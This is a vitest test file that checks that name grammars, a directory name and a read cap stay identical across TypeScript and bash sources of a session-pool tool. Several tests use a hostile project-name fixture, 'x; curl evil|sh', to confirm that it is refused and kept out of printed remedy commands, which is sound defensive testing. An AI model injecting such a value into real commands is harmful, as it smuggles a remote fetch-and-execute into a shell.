// The pool vocabulary is spelled once per LANGUAGE and the spellings are held
// equal HERE, because they cannot be held equal structurally: `ccd/ccd` sources
// nothing from this repository, and `ccd/ccrc-doctor-checks` is sourced under
// `set -u` by things that are not `ccrc` (`ccrc-doctor.test.ts`'s `tableNames()`
// does exactly that), so neither can import a TypeScript constant. This is the
// `CCRC_RC_FILE` mechanism from `single-definition.test.ts`, applied to the
// values the pool design puts in more than one language: the NAME GRAMMAR
// (three spellings — TypeScript, `ccd/ccd`, `ccrc-doctor-checks`), the
// DIRECTORY NAME (three as well, and the third of those was pinned by nothing
// until the fourth describe below was written; see its own header), the
// PROJECT-NAME grammar the doctor filters its printed command by, and — fix
// round 7 — the READ CAP, which is two spellings of one number and was pinned
// by nothing at all: `ccrc-doctor.test.ts` can only bound it to a range.
//
// The precedent this improves on is `ccd/ccrc-wrapper-shape:67`, which holds a
// hand-written bash copy of `shared/roster.ts`'s `ID_RE` and discloses that
// nothing pins it. These two are pinned.
//
// EXACTLY ONE occurrence each, not "at least one": a second assignment in the
// same file is the drift this exists to refuse, and a scan that took the first
// match would not see it.
import { describe, it, expect } from 'vitest';
import { spawnSync } from 'node:child_process';
import { readFileSync } from 'node:fs';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { POOL_NAME_RE } from '../../shared/roster.js';
import { POOLS_DIR_NAME } from '../src/pools.js';
import { CCD, makeCcdHarness } from './ccdWsHelpers.js';
import { mkTmp } from './tmpHelpers.js';

const here = path.dirname(fileURLToPath(import.meta.url));
const ccrcRoot = path.resolve(here, '..', '..');
const ccdSrc = readFileSync(CCD, 'utf8');
/** bash's absolute path, resolved ONCE under this process's real PATH. The one
 *  run below hands its child an EMPTY PATH — `_check_pools` forks nothing, and
 *  an empty PATH is the strongest statement of that — and libuv resolves the
 *  executable against the CHILD's environment, so a bare `bash` would be
 *  ENOENT. `ccrc-doctor.test.ts:66` resolves it the same way for the same
 *  reason. */
const BASH = spawnSync('bash', ['-c', 'command -v bash'], { encoding: 'utf8' }).stdout.trim();

/** The single capture, with the count asserted first — a helper rather than a
 *  repeated three-line block, because this file makes the same claim about
 *  three literals in two files. */
const exactlyOne = (src: string, re: RegExp, what: string): string => {
  // The COUNT is taken over ANY assignment to the name `re` pins — any
  // indentation, any quoting, or none — never over `re` itself. A scan that
  // counted only the canonical shape would count ZERO for a second
  // assignment written indented or double-quoted, and a guard that answers
  // "exactly one" by finding zero of the wrong thing and zero of the right
  // thing is not measuring anything. The bare name is read off `re`'s own
  // source (`^NAME=…`) so the broad scan and the canonical scan can never
  // name two different identifiers by accident.
  const name = /^\^([A-Za-z_][A-Za-z0-9_]*)=/.exec(re.source)?.[1];
  expect(name, `${what}: could not read a bare NAME= off the canonical regex`).toBeTruthy();
  // `export`/`declare`/`local`/`readonly`/`typeset` in front of the name is
  // still an ASSIGNMENT to it, not a different name — a duplicate spelled
  // `export POOL_NAME_RE=…` must count too, or this scan is exactness in
  // name only. `declare` and `typeset` (its synonym) also take FLAGS before
  // the name (`declare -r NAME=…`, `declare -g NAME=…`), so the keyword may
  // be followed by any number of `-x`-shaped flag tokens before the name.
  const broad = [...src.matchAll(
    new RegExp(
      `^[ \\t]*(?:(?:export|declare|local|readonly|typeset)(?:[ \\t]+-[A-Za-z]+)*[ \\t]+)?${name}=.*$`,
      'gm',
    ),
  )];
  expect(broad.length, `${what}: expected exactly one occurrence, found ${broad.length}`).toBe(1);
  // Only once exactly one assignment exists, in ANY spelling, is it worth
  // asking whether THAT ONE is the canonical, unindented, single-quoted
  // form — a first assignment in the wrong spelling must red here, not
  // silently pass because there happened to be only one of it.
  const canon = [...src.matchAll(re)];
  expect(canon.length, `${what}: the one assignment found is not in the canonical spelling`).toBe(1);
  return canon[0]![1]!;
};

describe('the pool-name grammar is one grammar in two languages', () => {
  it('guards the guard: the TypeScript regex is the anchored shape it claims to be', () => {
    // A `POOL_NAME_RE` that had become `//` would make every comparison below
    // pass against an empty bash literal.
    expect(POOL_NAME_RE.source.startsWith('^')).toBe(true);
    expect(POOL_NAME_RE.source.endsWith('$')).toBe(true);
    expect(POOL_NAME_RE.source.length).toBeGreaterThan(8);
  });

  it('ccd/ccd holds exactly one POOL_NAME_RE, byte-equal to shared/roster.ts', () => {
    const bash = exactlyOne(ccdSrc, /^POOL_NAME_RE='([^']*)'$/gm, 'ccd/ccd POOL_NAME_RE');
    expect(bash).toBe(POOL_NAME_RE.source);
  });

  it('ccd/ccrc-doctor-checks holds exactly one POOL_NAME_RE, byte-equal to the other two', () => {
    // A THIRD bash spelling, and the reason it exists rather than being
    // imported: this file is sourced under `set -u` by things that are not
    // `ccrc` (this suite's own `tableNames()` is one), so it cannot reference
    // another tool's variable at the top level — D-92's trade, the one
    // `CCRC_RC_FILE` already makes here. What it CAN have is a pin.
    const checks = readFileSync(path.join(ccrcRoot, 'ccd', 'ccrc-doctor-checks'), 'utf8');
    const bash = exactlyOne(checks, /^POOL_NAME_RE='([^']*)'$/gm, 'ccrc-doctor-checks POOL_NAME_RE');
    expect(bash).toBe(POOL_NAME_RE.source);
  });
});

describe('the pools directory is one name in two languages (the third spelling is below)', () => {
  it('ccd/ccd holds exactly one POOLS_DIR, and its tail is POOLS_DIR_NAME', () => {
    const tail = exactlyOne(ccdSrc, /^POOLS_DIR="\$REG\/([^"]*)"$/gm, 'ccd/ccd POOLS_DIR');
    expect(tail).toBe(POOLS_DIR_NAME);
  });

  it('guards the guard: POOLS_DIR_NAME is a plain dotless segment', () => {
    // A dot-leading directory would land inside ccd's own private namespace
    // (spec §4), and a name with a slash would not be one directory at all.
    expect(POOLS_DIR_NAME).toMatch(/^[a-z][a-z0-9-]*$/);
  });
});

describe('the pools directory has a THIRD spelling, and it is pinned too', () => {
  // `pool-name-parity.test.ts` was titled "one name in two languages" while
  // there were three: `ccd/ccrc-doctor-checks`'s `_check_pools` opens with its
  // own literal `$HOME/.cc-sessions/pools`, pinned by nothing. A rename would
  // have reddened the two describes above, been "fixed" in both, and left the
  // doctor silently reading the old directory — and answering `PASS pools: no
  // project pools tagged … every project is unconstrained` for a box where
  // every project IS tagged, which is this file's worst verdict shape.
  //
  // TEXT FIRST, THEN EFFECT. The text scan proves there is exactly ONE
  // `.cc-sessions/<segment>` literal in that file and that its segment is
  // `POOLS_DIR_NAME`; the run below proves the running check actually reads
  // the directory that constant names, which no text scan can show.
  const checks = readFileSync(path.join(ccrcRoot, 'ccd', 'ccrc-doctor-checks'), 'utf8');

  it('ccd/ccrc-doctor-checks names .cc-sessions/<dir> exactly once, and <dir> is POOLS_DIR_NAME', () => {
    // Comment lines are excluded: this file's prose names the path in its own
    // header, and a comment cannot make the check read anywhere.
    const hits = checks.split('\n')
      .filter((l) => !/^\s*#/.test(l))
      .flatMap((l) => [...l.matchAll(/\.cc-sessions\/([A-Za-z0-9._-]+)/g)].map((m) => m[1]!));
    expect(hits.length, `expected exactly one .cc-sessions/<dir> literal, found ${hits.length}: ${hits.join(', ')}`).toBe(1);
    expect(hits[0]).toBe(POOLS_DIR_NAME);
  });

  it('the doctor check READS the directory POOLS_DIR_NAME names', () => {
    // Sourced standalone under `set -u`, the way `ccrc-doctor.test.ts`'s own
    // `tableNames()` does it — `_check_pools` forks nothing, so this needs no
    // stub binaries and no PATH beyond bash's own.
    const home = mkTmp('ccrc-pools-doctor-parity-');
    try {
      const d = path.join(home, '.cc-sessions', POOLS_DIR_NAME);
      fs.mkdirSync(d, { recursive: true });
      fs.mkdirSync(path.join(home, 'projects', 'demo'), { recursive: true });
      // Bytes no grammar accepts, so a check that READS this file must FAIL
      // `pools-malformed`. A check reading some OTHER directory finds nothing
      // and PASSes "no project pools tagged" — the two are never confusable.
      fs.writeFileSync(path.join(d, 'demo'), 'Pool a');
      const r = spawnSync(BASH, ['-c',
        `set -uo pipefail; . ${JSON.stringify(path.join(ccrcRoot, 'ccd', 'ccrc-doctor-checks'))}; _check_pools`],
        { encoding: 'utf8', cwd: home, env: { HOME: home, PATH: '' } });
      expect(r.stdout, `doctor did not read ${d}:\n${r.stdout}${r.stderr}`)
        .toContain('FAIL pools: pools-malformed: demo');
    } finally {
      fs.rmSync(home, { recursive: true, force: true });
    }
  });
});

describe('the VERB writes where POOLS_DIR_NAME says, on a real box', () => {
  it('the verb writes where POOLS_DIR_NAME says the server will look', () => {
    // Text extraction proves the two LITERALS agree. This proves the running
    // bash actually joins them the way the TypeScript will: a `POOLS_DIR` that
    // was correct in its assignment and wrong at its use site is invisible to
    // the extraction above.
    const h = makeCcdHarness('ccrc-pool-parity-');
    try {
      h.makeRepo('demo');
      expect(h.sh('cmd_project_pool --project demo --pool pool-a')).toBe('tagged demo pool-a');
      const p = path.join(h.home, '.cc-sessions', POOLS_DIR_NAME, 'demo');
      expect(fs.existsSync(p), `nothing at ${p}`).toBe(true);
      expect(fs.readFileSync(p, 'utf8')).toBe('pool-a');
    } finally {
      h.cleanup();
    }
  });
});

// ── the THIRD value this file holds equal: the PROJECT-NAME grammar ────────
// `ccrc-doctor-checks`'s `pools-stale` remedy prints one copy-pasteable
// `ccd project-pool --project <n> --clear` per stale tag, and `<n>` is a
// FILENAME read off the box's own disk. Fix round 7 filters it, and the
// comment beside that filter makes a CROSS-FILE claim in prose:
//
//   "The charset is `_ws_project_valid`'s own (`ccd:3685`,
//    `^[A-Za-z0-9._-]+$`, no dot-leading), so no name `ccd` would ever
//    CREATE is omitted — a cross-file claim, and `pool-name-parity.test.ts`
//    measures it rather than trusting this sentence."
//
// This is that measurement, and the sentence sends the reader HERE, so a
// describe that did not exist would make the disclosure itself false.
//
// (That quote's LINE ANCHOR is stale and nothing below fixes it — this file
// may not edit `ccd/ccd`. Measured 2026-09-06: `_ws_project_valid` is at
// `ccd:3709`, and `ccd:3685` is a line of `_reg_purge`'s comment block. No
// pin is added for it: an assertion on a line NUMBER reds on every edit
// above it, which is how the number went stale in the first place.)
//
// WHAT THE MEASUREMENT FOUND IS NOT WHAT THE FIRST HALF OF THAT SENTENCE
// SAYS. The two filters agree on eight of the nine names below and disagree
// on the ninth: `-lead` is a name `ccd` DOES create — `_ws_project_valid`
// accepts it (`-` is in the charset, and only a leading DOT is refused), and
// `cmd_project_pool --project -lead --pool <p>` really writes the tag, both
// measured below — and the doctor omits it anyway. The second half of the
// same comment says so out loud ("A leading `-` is refused too: it is
// shell-safe but would be read by `ccd` as a flag"), so the filter is
// deliberate, not a drift; it is the summary clause that overstates.
//
// So the property pinned here is the TRUE one, and it is the one worth
// having: the doctor's filter is a SUBSET of `ccd`'s grammar. Every name it
// keeps is a name `ccd` would create, which is the safety direction — a
// remedy never prints a command for a name that could not be a project — and
// the only names it drops that `ccd` would keep are the leading-dash ones,
// which is exactly the `-*` arm. That second half is measured over the nine
// names below and no further — see that assertion's own note on what a table
// of nine does and does not establish. A charset that drifted in either file
// breaks the first half, in whichever direction it drifted.
describe('the project-name grammar is one grammar in two files (and the doctor is stricter by exactly one arm)', () => {
  // Resolved once each rather than at each use, so the two shipped files
  // this describe reads have one name apiece — the same reason `ccdSrc`
  // above has one.
  const CCD_PATH = CCD;
  const CHECKS_PATH = path.join(ccrcRoot, 'ccd', 'ccrc-doctor-checks');

  /** The whole text of a top-level bash function, from its `name() {` line to
   *  the first `}` in COLUMN ZERO. That end rule is what makes this cheap and
   *  what makes it wrong for a function whose body closes a block at column
   *  zero — `_ws_project_valid` is four lines and does not.
   *
   *  THE COUNT IS TAKEN BROADLY FIRST, then narrowly — `exactlyOne`'s rule at
   *  the top of this file, applied to a definition instead of an assignment,
   *  and it was NOT applied here for one round. The narrow count sees only a
   *  column-zero `name() {`; measured on a scratchpad copy of `ccd/ccd`, a
   *  second definition spelled `function name { … }`, `name () { … }` or
   *  indented left this whole suite GREEN at 16/16 while bash honoured the
   *  LAST definition — so a loosened `_ws_project_valid` could ship with the
   *  nine-name table below still reporting the FIRST one's answers. That
   *  function is `cmd_project_pool`'s only gate on the joined path, so the
   *  brittle count sat on a path-containment guard. A guard that answers
   *  "exactly one" by finding zero of the wrong shape and one of the right
   *  one is not measuring anything. */
  const oneFunction = (src: string, name: string): string => {
    const lines = src.split('\n');
    const esc = name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const broadRe = new RegExp(
      `^[ \\t]*(?:function[ \\t]+)?${esc}[ \\t]*\\([ \\t]*\\)[ \\t]*\\{` +
      `|^[ \\t]*function[ \\t]+${esc}[ \\t]*\\{`, 'gm');
    const broad = [...src.matchAll(broadRe)];
    expect(broad.length,
      `${name}: expected exactly one definition in ANY bash spelling, found ${broad.length} ` +
      '— a second one wins at runtime and this scan would still read the first',
    ).toBe(1);
    const opens = lines.flatMap((l, i) => (l.startsWith(`${name}() {`) ? [i] : []));
    expect(opens.length, `${name}: expected exactly one definition, found ${opens.length}`).toBe(1);
    const start = opens[0]!;
    const end = lines.findIndex((l, i) => i > start && l === '}');
    expect(end, `${name}: no closing brace in column zero after line ${start + 1}`).toBeGreaterThan(start);
    return lines.slice(start, end + 1).join('\n');
  };

  /** `_check_pools`'s omit arm, matched on the WHOLE arm rather than on the
   *  charset alone. The charset alone would be the wrong thing to count in
   *  either file: that charset literal is NOT unique in `ccd/ccd` — session
   *  ids share the shape, so it appears many times over (a count measured
   *  once is a snapshot of a file this very test reads, so the number is
   *  deliberately not written here), and this describe makes no claim at all
   *  about those occurrences. What must be unique is the arm that DECIDES
   *  WHICH NAMES REACH A PRINTED COMMAND. */
  const OMIT_ARM_RE = /^[ \t]*(\S+)\) p_stale_omit=\$\(\(p_stale_omit \+ 1\)\); continue ;;$/gm;

  const ccdValidFn = (): string => oneFunction(readFileSync(CCD_PATH, 'utf8'), '_ws_project_valid');

  const omitPattern = (): string => {
    const arms = [...readFileSync(CHECKS_PATH, 'utf8').matchAll(OMIT_ARM_RE)];
    expect(arms.length, `expected exactly one p_stale_omit case arm, found ${arms.length}`).toBe(1);
    return arms[0]![1]!;
  };

  it('both files spell one charset, and it is the same set of characters', () => {
    // `ccd` states the charset POSITIVELY (`^[…]+$`, match to accept); the
    // doctor states it NEGATIVELY (`*[!…]*`, match to omit). Two spellings of
    // one set, so the comparison is on the class body, and it is byte-equal
    // rather than set-equal on purpose: `[A-Za-z0-9._-]` and `[-A-Za-z0-9._]`
    // are the same set, but a reader comparing the two files by eye is the
    // mechanism this pin replaces, and two identical strings are the only
    // thing that reads as obviously equal.
    const ccdClass = /\[\[ "\$1" =~ \^\[([^\]]+)\]\+\$ \]\]/.exec(ccdValidFn())?.[1];
    expect(ccdClass, '_ws_project_valid no longer holds an anchored ^[…]+$ test on "$1"').toBeTruthy();
    const doctorClass = /\*\[!([^\]]+)\]\*/.exec(omitPattern())?.[1];
    expect(doctorClass, "the p_stale_omit arm no longer holds a negated *[!…]* class").toBeTruthy();
    expect(doctorClass).toBe(ccdClass);
    // Guards the guard: a capture that had collapsed to something empty or
    // trivial would make the equality above pass while measuring nothing.
    expect(ccdClass!.length).toBeGreaterThan(8);
  });

  it('both files refuse a dot-leading name, and each says so in its own idiom', () => {
    // `ccd`'s charset ALLOWS a dot, so the dot-leading refusal is a SECOND,
    // separate line there — delete it and the charset comparison above still
    // passes byte-for-byte while `.hidden` becomes a legal project. The
    // doctor carries it as its own `.*` arm for the same reason. Neither is
    // implied by the other, so both are asserted.
    expect(ccdValidFn()).toContain('[[ "$1" != .* ]] || return 1');
    expect(omitPattern().split('|')).toContain('.*');
  });

  it('the doctor omits the empty name and the leading-dash names too, and only those', () => {
    // The arm is a fixed list, so pin the WHOLE list rather than its members
    // one at a time: a fifth pattern appearing here is a widening of what the
    // remedy refuses to print, and it must be argued, not slipped in.
    expect(omitPattern().split('|')).toEqual(["''", '.*', '-*', '*[!A-Za-z0-9._-]*']);
  });

  // ── EFFECT, not text ──────────────────────────────────────────────────
  // Two regexes can be byte-equal and still be read differently by bash: the
  // doctor's is a GLOB in a `case`, `ccd`'s is an ERE in `[[ =~ ]]`, and the
  // dot-leading and empty arms have no counterpart in the other file at all.
  // So the same nine names go through BOTH REAL FILTERS, in one bash run.
  const NAMES = ['demo', 'a.b', 'a_b', 'a-b', '.hidden', '-lead', 'x; curl evil|sh', 'x y', ''] as const;

  /** Runs the shipped `_ws_project_valid` and the shipped omit arm over
   *  `NAMES`, returning one `"<accept|refuse> <omit|keep>"` per name.
   *
   *  The function text and the case pattern are the FILES' OWN BYTES, spliced
   *  into a script — not a hand-copy of them, which would be the third
   *  spelling this whole file exists to refuse. PATH is empty, as it is for
   *  the `_check_pools` run above and for the same reason: neither filter
   *  forks anything, and `printf` is a builtin. */
  const measurePair = (): string[] => {
    const script = [
      'set -uo pipefail',
      ccdValidFn(),
      '_doctor_omits() {',
      '  case "$1" in',
      `    ${omitPattern()}) return 0 ;;`,
      '  esac',
      '  return 1',
      '}',
      'for n in "$@"; do',
      '  if _ws_project_valid "$n"; then a=accept; else a=refuse; fi',
      '  if _doctor_omits "$n"; then b=omit; else b=keep; fi',
      '  printf "%s %s\\n" "$a" "$b"',
      'done',
    ].join('\n');
    const r = spawnSync(BASH, ['-c', script, 'bash', ...NAMES], { encoding: 'utf8', env: { PATH: '' } });
    expect(r.status, `the paired run did not complete:\n${r.stdout}${r.stderr}`).toBe(0);
    const rows = r.stdout.split('\n').filter((l) => l !== '');
    expect(rows.length, `expected one row per name, got ${rows.length}`).toBe(NAMES.length);
    return rows;
  };

  it('the two filters, run for real, answer this exact table', () => {
    // Measured, name by name, against the shipped bytes of both files. The
    // one row that is not agreement is `-lead`, and it is written out here
    // rather than excused in prose, so a change to EITHER file that moved it
    // — in either direction — is a red line an author has to look at.
    const rows = measurePair();
    expect(Object.fromEntries(NAMES.map((n, i) => [n, rows[i]!]))).toEqual({
      'demo': 'accept keep',
      'a.b': 'accept keep',
      'a_b': 'accept keep',
      'a-b': 'accept keep',
      '.hidden': 'refuse omit',
      '-lead': 'accept omit',
      'x; curl evil|sh': 'refuse omit',
      'x y': 'refuse omit',
      '': 'refuse omit',
    });
  });

  it('the doctor is a SUBSET of ccd: it never keeps a name ccd would refuse', () => {
    // The safety direction, stated as the property rather than as nine rows.
    // A `keep` on a name `ccd` refuses is a name that cannot be a project
    // going into a command an operator is invited to paste — which is the
    // whole defect MUST-FIX 2 closed.
    const rows = measurePair();
    const keptButRefused = NAMES.filter((_, i) => rows[i] === 'refuse keep');
    expect(keptButRefused, `the doctor prints a command for names ccd would refuse: ${keptButRefused.join(', ')}`).toEqual([]);
    // Guards the guard: `toEqual([])` over a table the doctor omitted
    // ENTIRELY would pass while measuring nothing at all.
    expect(NAMES.filter((_, i) => rows[i]!.endsWith(' keep')).length).toBeGreaterThan(0);
  });

  it('the only names they disagree on are the leading-dash ones', () => {
    // The exact size of the gap the summary clause in `_check_pools` glosses
    // over. A charset edit that made them disagree on one of these nine reds
    // here and names it — and it reds where the subset property above stays
    // GREEN, because that property is one-directional: a doctor getting
    // STRICTER cannot print a command it should not have, so it is safe and
    // invisible there, and this is the assertion that sees it.
    //
    // WHAT THIS DOES NOT ESTABLISH: nine names are a table, not a proof over
    // every string. It shows the two filters agreeing where the design says
    // they must and disagreeing only where the `-*` arm says they will; it
    // cannot show there is no third disagreement nobody thought to write
    // down. The charset equality above is the part that generalises.
    const rows = measurePair();
    const disagree = NAMES.filter((_, i) => rows[i] === 'accept omit' || rows[i] === 'refuse keep');
    expect(disagree).toEqual(['-lead']);
    expect(disagree.every((n) => n.startsWith('-'))).toBe(true);
  });

  // ── the two ENDS of the claim, on real files ──────────────────────────
  // Everything above runs the two filters in isolation. These two prove the
  // filters are the ones the shipped tools actually use — that `-lead` is a
  // tag `ccd` will really create, and that `_check_pools` really keeps it and
  // the hostile name out of the printed command.
  it('ccd really creates a tag whose name the doctor will omit', () => {
    // Without this, "`-lead` is a name ccd would create" is a claim about a
    // function nobody proved is reached. `cmd_project_pool`'s arity `case`
    // binds `project=$2` positionally, so a leading dash is never read as a
    // flag on the way in — measured here, not reasoned about.
    const h = makeCcdHarness('ccrc-pool-dash-');
    try {
      fs.mkdirSync(path.join(h.home, 'projects', '-lead'), { recursive: true });
      expect(h.sh('cmd_project_pool --project -lead --pool pool-a')).toBe('tagged -lead pool-a');
      const p = path.join(h.home, '.cc-sessions', POOLS_DIR_NAME, '-lead');
      expect(fs.readFileSync(p, 'utf8')).toBe('pool-a');
    } finally {
      h.cleanup();
    }
  });

  it('ccd really REFUSES the hostile name, so the gate is the running function and not the first copy of it', () => {
    // The negative arm the positive one above cannot supply. A second,
    // looser `_ws_project_valid` appended to `ccd/ccd` in a spelling the
    // scan misses would still create `-lead` happily — measured — so
    // "ccd would never create this name" needs a name the gate must REFUSE,
    // run against the shipped file. `x; curl evil|sh` is the doctor's own
    // hostile fixture below, closing the loop: the reason the remedy may
    // omit it is that `ccd` cannot have made it through this verb.
    const h = makeCcdHarness('ccrc-pool-hostile-');
    try {
      let stderr = '';
      let threw = false;
      try {
        h.sh('cmd_project_pool --project "x; curl evil|sh" --pool pool-a');
      } catch (err) {
        threw = true;
        stderr = String((err as { stderr?: string }).stderr ?? '');
      }
      expect(threw, 'cmd_project_pool accepted a name no project may hold').toBe(true);
      expect(stderr).toContain("invalid project 'x; curl evil|sh'");
      // And nothing landed: the refusal is BEFORE the filesystem.
      expect(fs.existsSync(path.join(h.home, '.cc-sessions', POOLS_DIR_NAME))).toBe(false);
    } finally {
      h.cleanup();
    }
  });

  it('_check_pools prints a command for the legal stale name and for neither of the other two', () => {
    // Three stale tags, one legal and two the filter drops for different
    // reasons — a shell-metacharacter name and a leading-dash name. The
    // FINDING must still name all three (an operator has to know they are
    // there); only the REMEDY is filtered, and the count of what it dropped
    // has to be in the text or the omission is silent.
    const home = mkTmp('ccrc-pools-stale-filter-');
    try {
      const d = path.join(home, '.cc-sessions', POOLS_DIR_NAME);
      fs.mkdirSync(d, { recursive: true });
      for (const n of ['demo-ok', 'x; curl evil|sh', '-lead']) {
        // A legal pool token in every one, so each lands in `p_stale` rather
        // than in `p_malformed` — the bucket under test is the stale one.
        fs.writeFileSync(path.join(d, n), 'pool-a');
      }
      // No `$HOME/projects` and no `$reg/*.project`, so all three are stale;
      // no `~/.ccrc/accounts.sh`, so the orphan arm makes no claim.
      const r = spawnSync(BASH, ['-c',
        `set -uo pipefail; . ${JSON.stringify(CHECKS_PATH)}; _check_pools`],
        { encoding: 'utf8', cwd: home, env: { HOME: home, PATH: '' } });
      const out = `${r.stdout}${r.stderr}`;
      const finding = out.split('\n').find((l) => l.includes('pools-stale:'));
      expect(finding, `no pools-stale line:\n${out}`).toBeTruthy();
      // The FINDING names all three, hostile bytes included — measured, and
      // it is the documented behaviour: that surface "is printed, never
      // executed", so the operator is told what is on their disk. (It is
      // joined with `; `, which the hostile name also contains, so the list
      // reads as four entries rather than three. Nothing here rules on that;
      // it is recorded so a reader does not mistake it for a defect this
      // pin covers.)
      for (const n of ['demo-ok', 'x; curl evil|sh', '-lead']) {
        expect(finding, `the finding does not name ${n}:\n${out}`).toContain(n);
      }
      // THE REMEDY IS THE FILTERED SURFACE, and it is the only one. Asserted
      // on its own line rather than on the whole output: `curl` appears in
      // the finding by design, so a whole-output scan would red on correct
      // behaviour (measured — that was this test's first shape).
      const remedy = out.split('\n').find((l) => l.trimStart().startsWith('remedy:'));
      expect(remedy, `no remedy line:\n${out}`).toBeTruthy();
      // The legal one is there as a runnable command.
      expect(remedy).toContain('ccd project-pool --project demo-ok --clear');
      // And neither of the other two, in any shape. `curl` is the payload the
      // hostile name would have executed; `--project -lead` is the shape the
      // dash name would have taken.
      expect(remedy).not.toContain('curl');
      expect(remedy).not.toContain('--project -lead');
      expect(remedy).not.toContain('--project x;');
      // Silent filtering would be its own defect: the count is stated.
      expect(remedy).toContain('2 name(s) are NOT printed as a command');
    } finally {
      fs.rmSync(home, { recursive: true, force: true });
    }
  });
});

// ── the read cap is one number in two files ────────────────────────────────
// `_project_pool_state` and `_check_pools` each bound their NUL-delimited read
// with `-n <N>` (D-1850). The doctor's per-tag arms exist to reach the same
// word the reader reaches for the same bytes, so a cap that drifted between
// them would make the doctor disagree with the authority on exactly the files
// nobody can otherwise inspect — an over-cap tag would read `malformed` in one
// and legal in the other.
//
// `ccrc-doctor.test.ts` pins the doctor's cap only by BEHAVIOUR, and behaviour
// bounds it to a range and no further: its 106-byte and 56-byte fixtures are
// satisfied by any cap in [56, 105] (measured — an `-n 80` build keeps both
// green). Its title used to say "applies the reader's 64-byte cap" and measured
// neither the number nor the cross-file half. This is where that half belongs.
describe('the tag read cap is one number in two files', () => {
  const CHECKS = path.join(ccrcRoot, 'ccd', 'ccrc-doctor-checks');
  // The whole `read` builtin call, wherever it is indented. Counted across the
  // FILE, not one function: a second capped read of a pools tag anywhere in
  // either file is the drift this refuses, and scoping to one function would
  // not see it.
  const CAP_RE = /read -r -d '' -n (\d+) v/g;

  const oneCap = (src: string, label: string): number => {
    const hits = [...src.matchAll(CAP_RE)];
    expect(hits.length, `${label}: expected exactly one capped tag read, found ${hits.length}`).toBe(1);
    return Number(hits[0]![1]!);
  };

  it('ccd/ccd and ccrc-doctor-checks bound the read at the same number', () => {
    expect(oneCap(readFileSync(CHECKS, 'utf8'), 'ccrc-doctor-checks'))
      .toBe(oneCap(ccdSrc, 'ccd/ccd'));
  });

  it('the cap clears the longest name the grammar allows, derived from the grammar itself', () => {
    // DERIVED, NOT WRITTEN: the longest string `POOL_NAME_RE` can match is its
    // one leading character plus the `{0,N}` bound on the rest. Hard-coding 32
    // here would be a fourth spelling of the grammar in a file whose whole
    // subject is that there are already three.
    const bound = /\{0,(\d+)\}/.exec(POOL_NAME_RE.source);
    expect(bound, 'POOL_NAME_RE no longer carries a {0,N} length bound').toBeTruthy();
    const maxName = Number(bound![1]!) + 1;
    // Strictly greater, so a legal name of the maximum length can never be
    // truncated into `malformed` by the guard meant to bound a runaway file.
    expect(oneCap(ccdSrc, 'ccd/ccd')).toBeGreaterThan(maxName);
  });
});
